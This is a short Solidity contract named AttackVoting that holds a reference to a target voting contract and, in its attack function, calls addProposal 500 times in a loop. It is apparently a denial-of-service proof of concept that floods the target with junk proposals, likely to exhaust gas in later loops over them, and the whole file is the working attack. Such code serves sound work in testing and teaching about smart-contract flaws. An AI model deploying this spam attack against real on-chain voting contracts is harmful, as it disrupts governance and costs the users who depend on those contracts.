// SPDX-License-Identifier: MIT

pragma solidity 0.8.30;

interface IVoting {
    function addProposal(string calldata _desc) external;
}

contract AttackVoting {

    IVoting voting;

    constructor(IVoting _voting) {
        voting = _voting;
    }

    function attack() external {
        for (uint i = 0; i < 500; i++) {
            voting.addProposal("proposal");
        }
    }
}
